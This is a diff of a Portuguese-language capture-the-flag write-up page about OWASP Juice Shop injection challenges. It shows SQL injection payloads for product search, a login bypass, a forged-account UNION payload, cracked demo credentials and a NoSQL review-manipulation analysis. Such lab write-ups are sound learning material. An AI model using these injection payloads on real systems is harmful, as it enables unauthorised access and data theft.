@@ -14,30 +14,34 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="description" content="InjectionUtilizando do sistema e analisando como posso interagir com ele, comecei interagindo com uma funcionalidade de busca.
 Ao carregar a página principal, o client faz uma request para /rest/products/search?q=, que traz um JSON de todos os produtos:
-}} Fazendo uma busca por Apple, nenhuma outra comunicação é feita para o backend, parece que o filtro é feito totalmente pelo client:
-}} Podemos reparar também que nossa busca é refletida no frontend, temos controle sobre elementos HTML renderizados no browser, além de reparar uma parâmetro ?q na consulta para o backend, aqui nos surge algumas possibilidades:
+Fazendo uma busca por Apple, nenhuma outra comunicação é feita para o backend, parece que o filtro é feito totalmente pelo client:
+Podemos reparar também que nossa busca é refletida no frontend, temos controle sobre elementos HTML renderizados no browser, além de reparar uma parâmetro ?q na consulta para o backend, aqui nos surge algumas possibilidades:
 ">
 <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
 <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
 <meta name="color-scheme" content="light dark">
-<meta name="format-detection" content="telephone=no"><meta property="og:url" content="http://localhost:1313/docs/ctf/juice-shop/injection/">
+<meta name="format-detection" content="telephone=no"><meta property="og:url" content="//localhost:1313/docs/ctf/juice-shop/injection/">
 	<meta property="og:site_name" content="Portas">
-	<meta property="og:title" content="Portas">
+	<meta property="og:title" content="Injection">
 	<meta property="og:description" content="InjectionUtilizando do sistema e analisando como posso interagir com ele, comecei interagindo com uma funcionalidade de busca.
 Ao carregar a página principal, o client faz uma request para /rest/products/search?q=, que traz um JSON de todos os produtos:
-}} Fazendo uma busca por Apple, nenhuma outra comunicação é feita para o backend, parece que o filtro é feito totalmente pelo client:
-}} Podemos reparar também que nossa busca é refletida no frontend, temos controle sobre elementos HTML renderizados no browser, além de reparar uma parâmetro ?q na consulta para o backend, aqui nos surge algumas possibilidades:">
+Fazendo uma busca por Apple, nenhuma outra comunicação é feita para o backend, parece que o filtro é feito totalmente pelo client:
+Podemos reparar também que nossa busca é refletida no frontend, temos controle sobre elementos HTML renderizados no browser, além de reparar uma parâmetro ?q na consulta para o backend, aqui nos surge algumas possibilidades:">
 	<meta property="og:locale" content="en_us">
 	<meta property="og:type" content="article">
 		<meta property="article:section" content="docs">
+		<meta property="article:published_time" content="2024-01-14T07:07:07+01:00">
+		<meta property="article:modified_time" content="2024-01-14T07:07:07+01:00">
 
 
-	<meta itemprop="name" content="Portas">
+	<meta itemprop="name" content="Injection">
 	<meta itemprop="description" content="InjectionUtilizando do sistema e analisando como posso interagir com ele, comecei interagindo com uma funcionalidade de busca.
 Ao carregar a página principal, o client faz uma request para /rest/products/search?q=, que traz um JSON de todos os produtos:
-}} Fazendo uma busca por Apple, nenhuma outra comunicação é feita para o backend, parece que o filtro é feito totalmente pelo client:
-}} Podemos reparar também que nossa busca é refletida no frontend, temos controle sobre elementos HTML renderizados no browser, além de reparar uma parâmetro ?q na consulta para o backend, aqui nos surge algumas possibilidades:">
-	<meta itemprop="wordCount" content="2160">
+Fazendo uma busca por Apple, nenhuma outra comunicação é feita para o backend, parece que o filtro é feito totalmente pelo client:
+Podemos reparar também que nossa busca é refletida no frontend, temos controle sobre elementos HTML renderizados no browser, além de reparar uma parâmetro ?q na consulta para o backend, aqui nos surge algumas possibilidades:">
+	<meta itemprop="datePublished" content="2024-01-14T07:07:07+01:00">
+	<meta itemprop="dateModified" content="2024-01-14T07:07:07+01:00">
+	<meta itemprop="wordCount" content="2129">
 
 <title>Injection • Portas</title>
 <link rel="icon" href="/favicon.svg" type="image/svg+xml">
@@ -45,11 +49,11 @@ Ao carregar a página principal, o client faz uma request para /rest/products/se
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
 <link rel="manifest" href="/manifest.json">
-<link rel="canonical" href="http://localhost:1313/docs/ctf/juice-shop/injection/">
+<link rel="canonical" href="//localhost:1313/docs/ctf/juice-shop/injection/">
 <link rel="stylesheet" href="/book.min.d2a63061af208ea46d4a5088bdb2c8d297df14bbb9064b630ae0b63dcb664760.css" integrity="sha256-0qYwYa8gjqRtSlCIvbLI0pffFLu5BktjCuC2PctmR2A=" crossorigin="anonymous">
 
 
-<script type="module" src="/en.search.min.5d7d2e44f776c41b94da5c54f7df9ffe0ff698ce88fe3f1b3bd9e7b1f82ccae2.js" integrity="sha256-XX0uRPd2xBuU2lxU99&#43;f/g/2mM6I/j8bO9nnsfgsyuI=" crossorigin="anonymous"></script>
+<script type="module" src="/en.search.min.9b35be230184439742bf457c1001d827b3c47983242b86467107c93f4cf30415.js" integrity="sha256-mzW&#43;IwGEQ5dCv0V8EAHYJ7PEeYMkK4ZGcQfJP0zzBBU=" crossorigin="anonymous"></script>
   
 </head>
 
@@ -85,66 +89,6 @@ Ao carregar a página principal, o client faz uma request para /rest/products/se
 
   
   <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-fd1b80fe704649033173072830dbda4c" class="toggle"  />
-    <label for="section-fd1b80fe704649033173072830dbda4c" class="flex">
-      <a role="button" class="">
-        Offensive Security</a>
-      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <input type="checkbox" id="section-b78b49e6983b03c601585815216f03c4" class="toggle"  />
-    <label for="section-b78b49e6983b03c601585815216f03c4" class="flex">
-      <a role="button" class="">
-        Initial Access</a>
-      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
-    </label>
-  
-
-          
-  <ul>
-    
-      
-        <li>
-          
-  
-  
-
-  
-    <a href="/docs/offsensive-security/inital-access/remote-template-injection/" class="">
-      Remote Template Injection</a>
-  
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
-    
-  </ul>
-
-        </li>
-      
     
       
         <li>
@@ -223,6 +167,20 @@ Ao carregar a página principal, o client faz uma request para /rest/products/se
   
     <a href="/docs/ctf/hack-the-box/challenges-web/jerrytok/" class="">
       Jerrytok</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/nomad-notes/" class="">
+      Nomad Notes</a>
   
 
         </li>
@@ -370,20 +328,6 @@ Ao carregar a página principal, o client faz uma request para /rest/products/se
   
 
   
-    <a href="/docs/ctf/juice-shop/cross-site-scriping/" class="">
-      Cross Site Scriping</a>
-  
-
-        </li>
-      
-    
-      
-        <li>
-          
-  
-  
-
-  
     <a href="/docs/ctf/juice-shop/injection/" class="active">
       Injection</a>
   
@@ -398,8 +342,82 @@ Ao carregar a página principal, o client faz uma request para /rest/products/se
   
 
   
+    <a href="/docs/ctf/juice-shop/cross-site-scriping/" class="">
+      XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
     <a href="/docs/ctf/juice-shop/readme/" class="">
       Readme</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fd1b80fe704649033173072830dbda4c" class="toggle"  />
+    <label for="section-fd1b80fe704649033173072830dbda4c" class="flex">
+      <a role="button" class="">
+        Offensive Security</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-b78b49e6983b03c601585815216f03c4" class="toggle"  />
+    <label for="section-b78b49e6983b03c601585815216f03c4" class="flex">
+      <a role="button" class="">
+        Initial Access</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/offsensive-security/inital-access/remote-template-injection/" class="">
+      Remote Template Injection</a>
   
 
         </li>
@@ -478,9 +496,9 @@ Ao carregar a página principal, o client faz uma request para /rest/products/se
   <article class="markdown book-article"><h1 id="injection">Injection<a class="anchor" href="#injection" aria-label="Link"></a></h1>
 <p>Utilizando do sistema e analisando como posso interagir com ele, comecei interagindo com uma funcionalidade de busca.</p>
 <p>Ao carregar a página principal, o client faz uma request para <code>/rest/products/search?q=</code>, que traz um JSON de todos os produtos:</p>
-<figure><img src="../../.gitbook/assets/image (111).png" >}}
+<figure><img src="../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>
 <p>Fazendo uma busca por Apple, nenhuma outra comunicação é feita para o backend, parece que o filtro é feito totalmente pelo client:</p>
-<figure><img src="../../.gitbook/assets/image (112).png" >}}
+<figure><img src="../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>
 <p>Podemos reparar também que nossa busca é refletida no frontend, temos controle sobre elementos HTML renderizados no browser, além de reparar uma parâmetro <code>?q</code> na consulta para o backend, aqui nos surge algumas possibilidades:</p>
 <ul>
 <li>Testar o front-end para XSS, visto que controlamos o texto HTML renderizado na tela;</li>
@@ -488,14 +506,14 @@ Ao carregar a página principal, o client faz uma request para /rest/products/se
 </ul>
 <h3 id="sql-injection-inicial">SQL Injection inicial<a class="anchor" href="#sql-injection-inicial" aria-label="Link"></a></h3>
 <p>Ainda temos o endoint <code>/rest/products/search?q=</code> para testar, e começar a manipular esse input <code>?q</code>. Fazendo uma busca por &ldquo;Apple&rdquo;, me retorna apenas os itens com Apple no nome no JSON:</p>
-<figure><img src="../../.gitbook/assets/image (114).png" >}}
+<figure><img src="../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>
 <p>Provavelmente, esse input que controlamos é usado em uma query sql, podemos manipular então manipular essa query. Fazendo essa request <code>GET /rest/products/search?q=xxdd%27%20or%20apple</code>, temos uma exception na tela que nos mostra a query utilizada, nos ajudando a craftar uma payload melhor para esse ataque:</p>
-<figure><img src="../../.gitbook/assets/image (115).png" >}}
+<figure><img src="../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>
 <p>Com isso, podemos ver que a query utilizada é:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> Products <span style="color:#66d9ef">WHERE</span> ((name <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;%$INPUT%&#39;</span> <span style="color:#66d9ef">OR</span> description <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;%$INPUT%&#39;</span>) <span style="color:#66d9ef">AND</span> deletedAt <span style="color:#66d9ef">IS</span> <span style="color:#66d9ef">NULL</span>) <span style="color:#66d9ef">ORDER</span> <span style="color:#66d9ef">BY</span> name</span></span></code></pre></div><p>e que input é utilizado diretamente na URL, então de fatos temos controle sobre a query.</p>
 <p><br>
 usando order by consegui identificar que existem 9 colunas na tabela, e com union all select: <code>aaaaa%' )) UNION ALL SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9 -- -</code> <br></p>
-<figure><img src="../../.gitbook/assets/image (116).png" >}}
+<figure><img src="../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>		<span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">1</span>,
 </span></span><span style="display:flex;"><span>		<span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#ae81ff">2</span>,
@@ -629,58 +647,58 @@ usando order by consegui identificar que existem 9 colunas na tabela, e com unio
 </span></span><span style="display:flex;"><span>	]
 </span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h3 id="logando-como-administrador--crack-hash">Logando como administrador | Crack Hash<a class="anchor" href="#logando-como-administrador--crack-hash" aria-label="Link"></a></h3>
 <p>Com isso, um dos desafios e logar como administrador do sistema, podemos tentar quebrar a Hash da senha dele (usando Hashcat ou similar) e tentar logar, vamos tentar primeiro no Crackstation:</p>
-<figure><img src="../../.gitbook/assets/image (117).png" >}}
+<figure><img src="../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>
 <p>Então podemos logar com <a href="mailto:admin@juice-sh.op">admin@juice-sh.op</a>:admin124</p>
-<figure><img src="../../.gitbook/assets/image (118).png" >}}
+<figure><img src="../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>
 <h3 id="logando-como-jim">Logando como Jim<a class="anchor" href="#logando-como-jim" aria-label="Link"></a></h3>
 <p>Logamos como admin e concluímos mais um desafio. Agora, o próximo é logar como jim, e o processo é o mesmo, quebramos a hash de sua senha, e ai temos as credenciais <a href="mailto:jim@juice-sh.op">jim@juice-sh.op</a>:ncc-1701 </p>
 <h3 id="logando-como-bender--auth-bypass">Logando como Bender | Auth bypass<a class="anchor" href="#logando-como-bender--auth-bypass" aria-label="Link"></a></h3>
 <p>O próximo relacionado ao login, é logar como bender, porém dessa vez, a hash dele não é crackeavel, vamos então analisar a interação entre o client e o server para executar o login de uma conta</p>
 <p>Podemos ver que é bem simples, mandamos as credenciais de login e senha, e ele nos devolve um token JWT e alguns meta-dados</p>
-<figure><img src="../../.gitbook/assets/image (119).png" >}}
+<figure><img src="../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>
 <p>Testando esses inputs, facilmente conseguimos triggar outra exception que nos revela mais um sql injection</p>
-<figure><img src="../../.gitbook/assets/image (120).png" >}}
+<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>
 <p>Podemos criar então outra payload de SQL Injection para bypassar esse mecanismo de login, colocando um breaking point nesse endpoint, assim que meu client enviar a request, a proxy irá interceptar para que eu altere antes de enviar para o server, com isso posso injetar a payload `bender@juice-sh.op&rsquo; &ndash; - ` para controlar a query fazendo com que, assim que ela pegue os dados do email inserido, o resto seja comentado e não tenha verificação pela senha, e assim o server irá concluir a autenticação com os dados do Bender:</p>
-<figure><img src="../../.gitbook/assets/image (121).png" >}}
+<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>
 <p>Executando a request:</p>
-<figure><img src="../../.gitbook/assets/image (122).png" >}}
+<figure><img src="../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>
 <p>Estou agora logado como Bender, e mais um desafio foi concluído.</p>
 <h2 id="ephemeral-accountant">Ephemeral Accountant<a class="anchor" href="#ephemeral-accountant" aria-label="Link"></a></h2>
 <p>Esse desafio nos pede para logar com uma conta com email &ldquo;<a href="mailto:acc0unt4nt@juice-sh.op">acc0unt4nt@juice-sh.op</a>&rdquo;, mas sem registrar ela.</p>
 <p>Minha primeira ideia foi aproveitar o controle do banco de dados pelo SQL Injection e fazer com que a query seja algo como &ldquo;select * from Users where email = &lsquo;<a href="mailto:acc0unt4nt@juice-sh.op">acc0unt4nt@juice-sh.op</a>&rsquo; &ndash; - para não fazer nenhuma verificação, porém com isso, nenhum dado seria retornado e daria erro na aplicação por não ter dados, então imediatamente fui pensar em outra ideia.</p>
 <p>Usando union select, posso fazer uma tabela virtual que preencha os campos da tabela User com dados controlados por mim, e como já temos o schema da tabela, podemos saber quais campos preencher, então a payload fica sendo essa:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;union select 1337 as &#39;</span>id<span style="color:#e6db74">&#39;, &#39;</span>account<span style="color:#e6db74">&#39; as &#39;</span>username<span style="color:#e6db74">&#39;, &#39;</span>acc0unt4nt<span style="color:#f92672">@</span>juice<span style="color:#f92672">-</span>sh.op<span style="color:#e6db74">&#39; as &#39;</span>email<span style="color:#e6db74">&#39;, &#39;</span><span style="color:#ae81ff">1337</span><span style="color:#e6db74">&#39; as &#39;</span>password<span style="color:#e6db74">&#39;, &#39;</span>customer<span style="color:#e6db74">&#39; as &#39;</span><span style="color:#66d9ef">role</span><span style="color:#e6db74">&#39;, &#39;</span>token1222<span style="color:#e6db74">&#39; as &#39;</span>deluxeToken<span style="color:#e6db74">&#39;, &#39;</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39; as &#39;</span>lastLoginIp<span style="color:#e6db74">&#39;, &#39;</span><span style="color:#f92672">/</span>assets<span style="color:#f92672">/</span><span style="color:#66d9ef">public</span><span style="color:#f92672">/</span>images<span style="color:#f92672">/</span>uploads<span style="color:#f92672">/</span><span style="color:#66d9ef">default</span>.svg<span style="color:#e6db74">&#39; as &#39;</span>profileImage<span style="color:#e6db74">&#39;, &#39;&#39; as &#39;</span>totpSecret<span style="color:#e6db74">&#39;, 1 as &#39;</span>isActive<span style="color:#e6db74">&#39;, DATE(&#39;</span>now<span style="color:#e6db74">&#39;) as &#39;</span>createdAt<span style="color:#e6db74">&#39;, DATE(&#39;</span>now<span style="color:#e6db74">&#39;) as &#39;</span>updateAt<span style="color:#e6db74">&#39;,NULL as &#39;</span>deletedAt<span style="color:#e6db74">&#39; -- -`</span></span></span></code></pre></div><figure><img src="../../.gitbook/assets/image (62).png" >}}
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;union select 1337 as &#39;</span>id<span style="color:#e6db74">&#39;, &#39;</span>account<span style="color:#e6db74">&#39; as &#39;</span>username<span style="color:#e6db74">&#39;, &#39;</span>acc0unt4nt<span style="color:#f92672">@</span>juice<span style="color:#f92672">-</span>sh.op<span style="color:#e6db74">&#39; as &#39;</span>email<span style="color:#e6db74">&#39;, &#39;</span><span style="color:#ae81ff">1337</span><span style="color:#e6db74">&#39; as &#39;</span>password<span style="color:#e6db74">&#39;, &#39;</span>customer<span style="color:#e6db74">&#39; as &#39;</span><span style="color:#66d9ef">role</span><span style="color:#e6db74">&#39;, &#39;</span>token1222<span style="color:#e6db74">&#39; as &#39;</span>deluxeToken<span style="color:#e6db74">&#39;, &#39;</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39; as &#39;</span>lastLoginIp<span style="color:#e6db74">&#39;, &#39;</span><span style="color:#f92672">/</span>assets<span style="color:#f92672">/</span><span style="color:#66d9ef">public</span><span style="color:#f92672">/</span>images<span style="color:#f92672">/</span>uploads<span style="color:#f92672">/</span><span style="color:#66d9ef">default</span>.svg<span style="color:#e6db74">&#39; as &#39;</span>profileImage<span style="color:#e6db74">&#39;, &#39;&#39; as &#39;</span>totpSecret<span style="color:#e6db74">&#39;, 1 as &#39;</span>isActive<span style="color:#e6db74">&#39;, DATE(&#39;</span>now<span style="color:#e6db74">&#39;) as &#39;</span>createdAt<span style="color:#e6db74">&#39;, DATE(&#39;</span>now<span style="color:#e6db74">&#39;) as &#39;</span>updateAt<span style="color:#e6db74">&#39;,NULL as &#39;</span>deletedAt<span style="color:#e6db74">&#39; -- -`</span></span></span></code></pre></div><figure><img src="../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
 <p>Temos o seguinte erro: <code>SQLITE_CONSTRAINT: FOREIGN KEY constraint failed</code></p>
 <p>Parece que em alguma parte do processo o Id é usado para recuperar a tabela Basket do usuário, então preciso de um ID válido para o join ser feito no corretamente com os dados dessa conta, vou usar o ID de uma conta existente, como 8:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; union select 8 as &#39;</span>id<span style="color:#e6db74">&#39;, &#39;</span>account<span style="color:#e6db74">&#39; as &#39;</span>username<span style="color:#e6db74">&#39;, &#39;</span>acc0unt4nt<span style="color:#f92672">@</span>juice<span style="color:#f92672">-</span>sh.op<span style="color:#e6db74">&#39; as &#39;</span>email<span style="color:#e6db74">&#39;, &#39;</span><span style="color:#ae81ff">1337</span><span style="color:#e6db74">&#39; as &#39;</span>password<span style="color:#e6db74">&#39;, &#39;</span>customer<span style="color:#e6db74">&#39; as &#39;</span><span style="color:#66d9ef">role</span><span style="color:#e6db74">&#39;, &#39;</span>token1222<span style="color:#e6db74">&#39; as &#39;</span>deluxeToken<span style="color:#e6db74">&#39;, &#39;</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">0</span><span style="color:#e6db74">&#39; as &#39;</span>lastLoginIp<span style="color:#e6db74">&#39;, &#39;</span><span style="color:#f92672">/</span>assets<span style="color:#f92672">/</span><span style="color:#66d9ef">public</span><span style="color:#f92672">/</span>images<span style="color:#f92672">/</span>uploads<span style="color:#f92672">/</span><span style="color:#66d9ef">default</span>.svg<span style="color:#e6db74">&#39; as &#39;</span>profileImage<span style="color:#e6db74">&#39;, &#39;&#39; as &#39;</span>totpSecret<span style="color:#e6db74">&#39;, 1 as &#39;</span>isActive<span style="color:#e6db74">&#39;, DATE(&#39;</span>now<span style="color:#e6db74">&#39;) as &#39;</span>createdAt<span style="color:#e6db74">&#39;, DATE(&#39;</span>now<span style="color:#e6db74">&#39;) as &#39;</span>updateAt<span style="color:#e6db74">&#39;,NULL as &#39;</span>deletedAt<span style="color:#e6db74">&#39; -- -</span></span></span></code></pre></div><p>e deu certo:</p>
-<figure><img src="../../.gitbook/assets/image (63).png" >}}
+<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
 <p>Com isso, posso fazer um breakingpoint na hora do login, e passar essa request que cria uma conta virtualmente na base de dados:</p>
-<figure><img src="../../.gitbook/assets/image (64).png" >}}
-<figure><img src="../../.gitbook/assets/image (65).png" >}}
+<figure><img src="../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>
 <p>Com isso logamos com a conta inexistente e fechando os desafios da parte de autenticação, podemos começar a explorar melhor agora a área logada do sistema e ver as novas interações que temos dessa forma.</p>
 <h2 id="christmas-special">Christmas special<a class="anchor" href="#christmas-special" aria-label="Link"></a></h2>
 <p>Um desafio da plataforma é comprar um produto que não está mais disponível, para isso, precisamos primeiro tentar achar o produto que não está disponível, e temos um endpoint que lista produtos que é vulnerável a SQL Injection, podemos fazer essa chamada: <code>GET /rest/products/search?q=%25%27%20or%201%3D1%29%29%20--%20- HTTP/1.1</code>, onde  a payload na query string `q` é <code>%' or 1=1)) -- -</code>, essa payload fecha o a consulta &ldquo;like&rdquo; e lista todos os produtos se 1 for igual 1.</p>
 <p>Na resposta, podemos ver que temos um registro com <code>deletedAt</code> diferente de null, então é o produto deletado que devemos comprar:</p>
-<figure><img src="../../.gitbook/assets/image (59).png" >}}
+<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>
 <p>Agora, vou ver como é a interação do client com o server para adicionar um produto ao carrinho:</p>
-<figure><img src="../../.gitbook/assets/image (60).png" >}}
+<figure><img src="../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>
 <p>Basicamente enviamos o ID do produto, o ID do carrinho e a quantidade. Como controlamos o produto e o carrinho, e sabendo que o ID do produto do desafio é 10, podemos apenas tentar adicionar ao carrinho o produto de ID 10 (e futuramente, tentar adicionar um produto em um carrinho que não seja nosso, mas fica para outro post). Usando minha proxy, fiz uma request trocando o ID do produto para 10, e funcionou, ele adicionou o produto deletado em meu carrinho:</p>
-<figure><img src="../../.gitbook/assets/image (61).png" >}}
+<figure><img src="../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>
 <p>Agora, vou excluir o Apple Juice que adicionei apenas para para entender como funciona o processo de adicionar item ao carrinho, e finalizar a compra com do Christmas Super-Surprise-Box (2014 Edition) Precisamos adicionar o endereço:</p>
-<figure><img src="../../.gitbook/assets/Pasted image 20240512211123.png" >}}
+<figure><img src="../../.gitbook/assets/Pasted image 20240512211123.png" alt=""><figcaption></figcaption></figure>
 <p>Escolher um tipo de entrega:</p>
-<figure><img src="../../.gitbook/assets/Pasted image 20240512211200.png" >}}
+<figure><img src="../../.gitbook/assets/Pasted image 20240512211200.png" alt=""><figcaption></figcaption></figure>
 <p>Adicionar um cartão e continuar a compra:</p>
-<figure><img src="../../.gitbook/assets/Pasted image 20240512211239.png" >}}
-<figure><img src="../../.gitbook/assets/Pasted image 20240512211325.png" >}}
+<figure><img src="../../.gitbook/assets/Pasted image 20240512211239.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Pasted image 20240512211325.png" alt=""><figcaption></figcaption></figure>
 <p>E finalmente, efetuar a compra:</p>
-<figure><img src="../../.gitbook/assets/Pasted image 20240512211346.png" >}}
+<figure><img src="../../.gitbook/assets/Pasted image 20240512211346.png" alt=""><figcaption></figcaption></figure>
 <p>E com isso, foi concluído o desafio de comprar um produto já deletado, através de SQL Injection (e da falta de validação do back-end, que deveria verificar se o produto está disponível antes de adicionar ao carrinho, mas não o fez).</p>
 <h2 id="nosql-manipulationx20">NoSQL Manipulation <a class="anchor" href="#nosql-manipulationx20" aria-label="Link"></a></h2>
 <p>Quando estamos autenticado, podemos deixar uma avaliação em um produto, usando uma proxy, podemos ver a interação entre o client e o server:</p>
-<figure><img src="../../.gitbook/assets/Pasted image 20240509170453.png" >}}
+<figure><img src="../../.gitbook/assets/Pasted image 20240509170453.png" alt=""><figcaption></figcaption></figure>
 <p>E na hora de ler as avaliações, podemos ver também com qual endpoint o client interage, e nele podemos ver que se trata de um schema de mongodb (caso não saiba o motivo, o campo __ id normalmente pertence ao mongodb):</p>
-<figure><img src="../../.gitbook/assets/Pasted image 20240509170800.png" >}}
+<figure><img src="../../.gitbook/assets/Pasted image 20240509170800.png" alt=""><figcaption></figcaption></figure>
 <p>Analisando o endpoint usado para criar o comentário, podemos tirar algumas hipóteses pela request:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">	</span><span style="color:#a6e22e">PUT</span> /rest/products/24/reviews <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
 </span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">...</span>
@@ -702,13 +720,13 @@ usando order by consegui identificar que existem 9 colunas na tabela, e com unio
 </span></span><span style="display:flex;"><span>	...
 </span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>ao invés de buscar o produto pelo ID, podemos tentar usar um query operator no nosso input para fazer o mongodb criar esse comentário em todos os produtos (<a href="https://www.mongodb.com/docs/manual/reference/operator/query/">https://www.mongodb.com/docs/manual/reference/operator/query/</a>).</p>
 <p>Tentando injetar query operator na URL:</p>
-<figure><img src="../../.gitbook/assets/Pasted image 20240509171009.png" >}}
+<figure><img src="../../.gitbook/assets/Pasted image 20240509171009.png" alt=""><figcaption></figcaption></figure>
 <p>Porém não funcionou, tentei a mesma ideia de outras formas e também não obtive resultado, então é provável que o servidor apenas crie um novo registro no mongodb, com um campo <code>product_id</code> que vem da URL, independe se o produto existe ou não, e então não buscar por um produto existente primeiro.</p>
 <p>Função de editar review:<br>
 Continuando a análise, ainda na parte de avaliação temos uma funcionalidade para editar uma avaliação, e com a proxy podemos ver como o client interage com o endpoint de edição:</p>
-<figure><img src="../../.gitbook/assets/Pasted image 20240509171045.png" >}}
+<figure><img src="../../.gitbook/assets/Pasted image 20240509171045.png" alt=""><figcaption></figcaption></figure>
 <p>Com essa request, podemos notar que um dos inputs de o ID do documento editado:</p>
-<figure><img src="../../.gitbook/assets/Pasted image 20240509171138.png" >}}
+<figure><img src="../../.gitbook/assets/Pasted image 20240509171138.png" alt=""><figcaption></figcaption></figure>
 <p>Depois de buscar no google por exemplos de update usando mongodb, podemos imaginar um pseudo-código parecido com isso para editar uma review:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">route</span>.<span style="color:#a6e22e">patch</span>(<span style="color:#e6db74">&#34;rest/products/review&#34;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">update_review</span>(<span style="color:#a6e22e">req</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Request</span>) 
